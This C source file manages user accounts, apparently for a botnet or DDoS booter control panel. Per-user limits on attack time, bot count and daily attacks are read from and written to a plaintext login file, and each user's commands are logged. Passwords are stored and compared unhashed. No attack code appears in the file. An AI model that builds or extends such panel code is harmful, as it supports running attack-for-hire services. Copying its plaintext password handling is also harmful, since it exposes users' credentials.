#include "../headers/users.h"
#include "../headers/theme_loader.h"
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>

User users[MAX_USERS];
int user_count = 0;
int user_sockets[MAX_USERS] = {0};
static pthread_mutex_t user_log_mutex = PTHREAD_MUTEX_INITIALIZER;

void log_user(const char *user, const char *ip, const char *msg) {
    pthread_mutex_lock(&user_log_mutex);
    char ts[32] = {0};
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    if (t) strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", t);
    char line[2048];
    snprintf(line, sizeof(line), "[%s] [%s] %s ran command: %s",
             ts, ip ? ip : "?",
             user ? user : "?", msg ? msg : "");
    FILE *f = fopen("database/userlogs.txt", "a");
    if (f) {
        fprintf(f, "%s\n", line);
        fclose(f);
    }
    printf("%s\n", line);
    fflush(stdout);
    pthread_mutex_unlock(&user_log_mutex);
}

void load_users(void) {
    /* remember who is online so reloads don't kick them */
    char online[MAX_USERS][50];
    int nonline = 0;
    for (int i = 0; i < user_count && i < MAX_USERS; i++) {
        if (users[i].is_logged_in && nonline < MAX_USERS) {
            strncpy(online[nonline], users[i].user, 49);
            online[nonline][49] = '\0';
            nonline++;
        }
    }
    /* remember daily counters */
    char cuser[MAX_USERS][50];
    int cused[MAX_USERS] = {0};
    time_t creset[MAX_USERS] = {0};
    char cip[MAX_USERS][32];
    time_t clogat[MAX_USERS] = {0};
    int ncount = 0;
    for (int i = 0; i < user_count && i < MAX_USERS; i++) {
        strncpy(cuser[ncount], users[i].user, 49);
        cuser[ncount][49] = '\0';
        cused[ncount] = users[i].attacks_today;
        creset[ncount] = users[i].reset;
        strncpy(cip[ncount], users[i].ip, 31);
        cip[ncount][31] = '\0';
        clogat[ncount] = users[i].login_at;
        ncount++;
    }

    FILE *f = fopen("database/logins.txt", "r");
    if (!f) return;
    user_count = 0;
    char line[256];
    while (user_count < MAX_USERS && fgets(line, sizeof(line), f)) {
        char u[50] = {0}, p[50] = {0}, adm[16] = {0};
        int mt = 0, mb = 0, md = 0;
        if (sscanf(line, "%49s %49s %d %d %15s %d", u, p, &mt, &mb, adm, &md) < 4) continue;
        User *e = &users[user_count];
        strncpy(e->user, u, 49); e->user[49] = '\0';
        strncpy(e->pass, p, 49); e->pass[49] = '\0';
        e->maxtime = mt;
        e->maxbots = mb;
        e->maxdaily = (sscanf(line, "%*s %*s %*d %*d %*s %d", &md) == 1) ? md : 0;
        e->is_admin = (strcasecmp(adm, "admin") == 0 || strcmp(adm, "1") == 0);
        e->is_logged_in = 0;
        e->attacks_today = 0;
        e->reset = 0;
        e->ip[0] = '\0';
        e->login_at = 0;
        strncpy(e->current_theme, "classic", sizeof(e->current_theme) - 1);
        e->current_theme[sizeof(e->current_theme) - 1] = '\0';
        for (int k = 0; k < nonline; k++) {
            if (strcmp(online[k], e->user) == 0) { e->is_logged_in = 1; break; }
        }
        for (int k = 0; k < ncount; k++) {
            if (strcmp(cuser[k], e->user) == 0) {
                e->attacks_today = cused[k];
                e->reset = creset[k];
                strncpy(e->ip, cip[k], 31);
                e->ip[31] = '\0';
                e->login_at = clogat[k];
                break;
            }
        }
        user_count++;
    }
    fclose(f);
}

int check_login(const char *user, const char *pass) {
    for (int i = 0; i < user_count; i++) {
        if (strcmp(user, users[i].user) == 0 && strcmp(pass, users[i].pass) == 0) {
            if (users[i].is_logged_in) return -2;
            return i;
        }
    }
    return -1;
}

int users_add(const char *user, const char *pass, int maxtime, int maxbots, int admin, int maxdaily) {
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, user) == 0) return -1;
    }
    if (user_count >= MAX_USERS) return -2;
    FILE *f = fopen("database/logins.txt", "a");
    if (!f) return -3;
    fprintf(f, "%s %s %d %d %s %d\n", user, pass, maxtime, maxbots, admin ? "admin" : "0", maxdaily);
    fclose(f);
    User *e = &users[user_count++];
    strncpy(e->user, user, 49); e->user[49] = '\0';
    strncpy(e->pass, pass, 49); e->pass[49] = '\0';
    e->maxtime = maxtime;
    e->maxbots = maxbots;
    e->maxdaily = maxdaily;
    e->is_admin = admin;
    e->is_logged_in = 0;
    e->attacks_today = 0;
    e->reset = 0;
    e->ip[0] = '\0';
    e->login_at = 0;
    strncpy(e->current_theme, "classic", sizeof(e->current_theme) - 1);
    e->current_theme[sizeof(e->current_theme) - 1] = '\0';
    return 0;
}

int users_remove(const char *target) {
    int found = 0;
    for (int i = 0; i < user_count; i++) {
        if (strcmp(users[i].user, target) == 0) { found = 1; break; }
    }
    if (!found) return -1;
    FILE *f = fopen("database/logins.txt", "r");
    FILE *t = fopen("database/logins.tmp", "w");
    if (!f || !t) {
        if (f) fclose(f);
        if (t) fclose(t);
        return -2;
    }
    char line[256];
    while (fgets(line, sizeof(line), f)) {
        char u[50] = {0};
        if (sscanf(line, "%49s", u) == 1 && strcmp(u, target) == 0) continue;
        fputs(line, t);
    }
    fclose(f);
    fclose(t);
    remove("database/logins.txt");
    rename("database/logins.tmp", "database/logins.txt");
    load_users();
    return 0;
}
